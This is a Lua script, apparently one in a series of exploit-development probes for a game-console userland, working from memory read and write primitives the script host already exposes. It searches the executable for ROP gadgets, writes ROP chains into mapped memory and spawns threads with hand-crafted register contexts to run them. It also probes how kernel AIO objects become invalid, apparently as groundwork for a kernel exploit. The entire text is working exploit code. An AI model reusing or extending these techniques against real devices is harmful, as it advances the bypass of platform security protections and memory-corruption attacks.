-- CRASH_CLASS: MODERATE
-- PROBE 1049a: why did a polled object go invalid in 1047a?
-- 1048a: create -> poll -> delete is 0 even 2 s later.  1047a: the same pair answered
-- 0x80020003 after a 4 MB mmap, a 1.4 MB chain build and a thr_create.  Isolate the step.
print("=== PROBE 1049a: what invalidates a polled object ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function mk(n) local t = {} for k, v in pairs(syscall.pipe) do t[k] = v end t.syscall_no = n setmetatable(t, getmetatable(syscall.pipe)) return t end
local function rd(a) local o, v = pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function rq(a) local o, v = pcall(function() return memory.read_qword(a) end) if o then return to_num(v) end end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(a, n) pcall(function() for i = 0, n - 4, 4 do memory.write_dword(a + i, 0) end end) end
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
local page = to_num(select(2, pcall(function() return mk(477)(uint64(0), uint64(0x20000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)))
if page == 0 then print("[!] mmap failed"); return end
zero(page, 0x20000)
local D, OUT, ST, PO = page, page + 0x4000, page + 0x8000, page + 0xC000
local sc669, sc662, sc664 = mk(669), mk(662), mk(664)
local function create()
    wd(D + 0x00, 0); wd(D + 0x08, 0); wd(D + 0x10, 0); wd(D + 0x18, 0); wd(D + 0x20, -1); wd(D + 0x24, 0)
    wq(OUT, uint64(0))
    local ok, rv = pcall(function() return sc669(uint64(0x1001), uint64(D), uint64(1), uint64(1), uint64(OUT)) end)
    return rd(OUT) or 0
end
local function poll(id)
    wq(PO, uint64(id)); wq(ST, uint64(0))
    local ok, rv = pcall(function() return sc664(uint64(PO), uint64(1), uint64(ST)) end)
    return rq(ST) or 0
end
local function del(id)
    wq(OUT, uint64(id)); wq(ST, uint64(0))
    local ok, rv = pcall(function() return sc662(uint64(OUT), uint64(1), uint64(ST)) end)
    return rq(ST) or 0
end

local function mmap(px) return to_num(select(2, pcall(function() return mk(477)(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end))) end
local Ctx = { MAGIC = 0x108, TYPE = 0x110, CS = 0x0C0, RIP = 0x0E0, RSP = 0x0F8, SS = 0x100, RAX = 0x078 }
local fn = to_num(syscall.pipe.fn_addr)
local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info + 0x10C) or 0) * 4294967296 + (rd(info + 0x108) or 0)
local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off; if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base + off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F, 0xC3))
local store = find_pat(ebase, 0x494000, string.char(0x48, 0x89, 0x07, 0xC3))
local jmp_g = find_pat(ebase, 0x494000, string.char(0xEB, 0xFE))
print(string.format("[0] eboot=%08X gadgets=%s/%s/%s/%s", ebase, tostring(pop_rax), tostring(pop_rdi), tostring(store), tostring(jmp_g)))

local function spawn_chain(words)
    local block = mmap(0x40000)
    if block == 0 then print("[!] chain mmap failed"); return false end
    local start = block + 0x4000
    for i, w in ipairs(words) do wq(start + 8 + (i - 1) * 8, uint64(w)) end
    local ctx = memory.alloc(0x500); zero(ctx, 0x500)
    wq(ctx + Ctx.MAGIC, uint64(0x480)); wq(ctx + Ctx.TYPE, uint64(0x10000))
    wq(ctx + Ctx.CS, uint64(0x43)); wq(ctx + Ctx.SS, uint64(0x3B))
    wq(ctx + Ctx.RIP, uint64(fn)); wq(ctx + Ctx.RSP, uint64(start + 8)); wq(ctx + Ctx.RAX, uint64(20))
    local tb = memory.alloc(8); wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0
end
local RES = mmap(0x4000)

-- A: mmap + a long chain build, no spawn
local ida = create(); local pa = poll(ida)
local big = mmap(0x400000)
for i = 1, 60000 do wq(big + 0x4000 + i * 8, uint64(pop_rax)) end
local da = del(ida)
print(string.format("[A] id=%08X poll=%08X mmap=%08X del=%08X", ida, pa, big, da))

-- B: spawn a trivial child (getpid, store, exit) then delete
local idb = create(); local pb = poll(idb)
local okb = spawn_chain({ pop_rax, 20, fn, pop_rdi, RES, store, pop_rdi, 0, pop_rax, 431, fn, jmp_g })
local ts = memory.alloc(16); wq(ts, 0); wq(ts + 8, 200000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end)
local db = del(idb)
print(string.format("[B] id=%08X poll=%08X spawn=%s res=%d del=%08X", idb, pb, tostring(okb), rd(RES) or 0, db))

-- C: spawn then poll then delete (order matters?)
local idc = create()
local okc = spawn_chain({ pop_rax, 20, fn, pop_rdi, RES, store, pop_rdi, 0, pop_rax, 431, fn, jmp_g })
wq(ts, 0); wq(ts + 8, 200000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end)
local pc = poll(idc)
local dc = del(idc)
print(string.format("[C] id=%08X spawn=%s poll_after_spawn=%08X del=%08X", idc, tostring(okc), pc, dc))
print("[Z] alive pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
